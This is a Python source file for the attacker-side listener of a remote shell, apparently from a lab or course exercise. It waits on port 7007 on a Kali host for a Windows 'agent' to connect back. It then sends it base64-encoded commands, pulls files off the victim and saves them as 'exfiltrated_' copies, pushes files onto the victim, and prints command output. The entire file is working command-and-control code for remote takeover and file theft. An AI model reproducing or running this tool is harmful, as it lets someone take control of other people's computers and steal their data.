import socket
import base64
import os

# --- Configuration ---
PORT = 7007
BUFFER_SIZE = 8192 

def start_listener():
    # Use 'with' to ensure the socket closes properly
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', PORT))
        s.listen(1)
        print(f"[*] Kali listening on port {PORT}...")
        
        conn, addr = s.accept()
        print(f"[*] Connection established from {addr}")

        while True:
            try:
                cmd = input("Agent007_Shell> ")
                if not cmd: continue

                # STEP 4: ENCRYPTION (Base64 encoding for the command)
                encoded_cmd = base64.b64encode(cmd.encode())
                conn.send(encoded_cmd)

                if cmd.lower() == "exit":
                    print("[*] Closing connection.")
                    break

                # --- STEP 3: RECEIVE FILES (Download from Windows to Kali) ---
                if cmd.startswith("download"):
                    filename = cmd.split(" ", 1)[1]
                    # Clean the path to get just the filename for saving on Kali
                    clean_name = os.path.basename(filename.replace("\\", "/"))
                    
                    print(f"[*] Downloading {clean_name} from Windows...")
                    conn.settimeout(4.0) # Safety timeout
                    try:
                        data = conn.recv(1024 * 1024) # 1MB Buffer for download
                        if data.startswith(b"ERROR"):
                            print(data.decode())
                        else:
                            with open(f"exfiltrated_{clean_name}", "wb") as f:
                                f.write(data)
                            print(f"[+] Success! Saved as exfiltrated_{clean_name}")
                    except socket.timeout:
                        print("[-] Timeout: No data received.")
                    finally:
                        conn.settimeout(None)

                # --- STEP 3: SEND FILES (Upload from Kali to Windows) ---
                elif cmd.startswith("upload"):
                    filename = cmd.split(" ", 1)[1]
                    if os.path.exists(filename):
                        print(f"[*] Waiting for Agent to be ready for {filename}...")
                        # Wait for the "READY_TO_RECEIVE" signal from Agent
                        ack = conn.recv(BUFFER_SIZE).decode()
                        if ack == "READY_TO_RECEIVE":
                            with open(filename, "rb") as f:
                                conn.send(f.read())
                            print(f"[*] Data sent. Waiting for confirmation...")
                            # Receive final confirmation message from agent
                            print(conn.recv(BUFFER_SIZE).decode())
                    else:
                        print(f"[-] Error: Local file '{filename}' not found on Kali.")

                # --- STEP 4: REMOTE CONTROL (Standard command output) ---
                else:
                    response = conn.recv(BUFFER_SIZE).decode()
                    print(response)

            except Exception as e:
                print(f"[-] An error occurred: {e}")
                break

if __name__ == "__main__":
    start_listener()